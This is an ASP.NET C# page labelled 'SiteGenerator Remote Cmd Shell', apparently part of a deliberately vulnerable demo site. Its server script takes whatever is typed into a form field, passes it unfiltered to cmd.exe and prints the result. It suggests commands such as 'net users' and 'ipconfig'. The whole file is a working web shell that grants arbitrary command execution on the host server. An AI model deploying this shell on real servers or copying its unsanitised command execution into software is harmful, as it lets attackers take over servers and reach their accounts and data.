<%@  Language="c#" %>
<%@Import Namespace="System.IO" %>
<%@Import Namespace="System.Diagnostics" %>
<%@Import Namespace="System.Threading" %>
<!-- Begin_Default_Vulnerability_HTML_code -->
<html>
<head>
    <title>SiteGenerator Remote Cmd Shell</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>
<body alink="#00">
    <!--#include virtual="\SiteGenerator_Banner.html" -->
    <h3>
       Remote Cmd Shell</h3>
    <hr />
    <form runat="server">
        <table border="1" cellspacing="0" cellpadding="4" bordercolor="#899db1" style="width: 800px">
            <tr bgcolor="#d2dae4">
                <td>
                    <b>Remote Cmd Shell</b></td>
            </tr>
            <tr>
                <td height="100">
                    <asp:Label ID="lblErrorMessage" runat="server" CssClass="errorMessage"></asp:Label>
                    <table border="0" cellpadding="6">
                        <tr>
                            <td style="width: 130px" valign="top">
                                <asp:Label ID="lbl" runat="server" Width="178px" CssClass="label1">Command to Execute</asp:Label>
                            </td>
                            <td style="width: 569px">
                                <asp:TextBox ID="txtCmdToExecute" runat="server" CssClass="txtBox2" TextMode="SingleLine"
                                    TabIndex="1" Width="300px"></asp:TextBox>                                 
                                <br />
                                <asp:Label ID="Label1" runat="server" ForeColor="Silver" Text="Dir c:\ <br>  ipconfig    <br>  at  <br>   Net users <br>  ping www.google.com"></asp:Label></td>
                        </tr>
                        <tr>
                            <td style="width: 130px; height: 29px">
                                &nbsp;</td>
                            <td style="width: 569px; height: 29px">
                                <asp:Button ID="btnLoginAdminSection" TabIndex="2" runat="server" CssClass="butnstyle2"
                                    Width="159px" Height="27px" Text="Execute" OnClick="btnLoginAdminSection_Click"></asp:Button>                              
                            </td>
                        </tr>
                        <tr>
                            <td colspan="2">    
                           <pre>                           
                                <asp:Label ID="lblResults" runat="server" Width="760px" CssClass="label1">...</asp:Label>
                                &nbsp;
                                </pre>                       
                            
                        </tr> 
                    </table>
                    </td>
            </tr>
        </table>
    </form>
</body>
</html>

<script runat="server">
   
     
    protected void btnLoginAdminSection_Click(object sender, System.EventArgs e)
    {
        string strTempFile = Path.GetTempFileName();
        string strCmdToExecute = @"cmd.exe";
        string strCmdParameters = @"/c " +txtCmdToExecute.Text +  @" > " +  strTempFile;
        Process pProcess = Process.Start(strCmdToExecute, strCmdParameters);
        while (!pProcess.HasExited )
            Thread.Sleep(100);    
        lblResults.Text = Server.HtmlEncode( GetFileContent(strTempFile));
        File.Delete(strTempFile);
    }

    public static string GetFileContent(string strFile)
    {
        try
        {
            FileStream fs = File.OpenRead(strFile);
            if (fs == null)
                return string.Empty;
            StreamReader sr = new StreamReader(fs);
            if (sr == null)
                return string.Empty;

            string strContent = sr.ReadToEnd();

            sr.Close();
            fs.Close();
            return strContent;
        }
        catch
        {
            return "";
        }
    } 
</script>

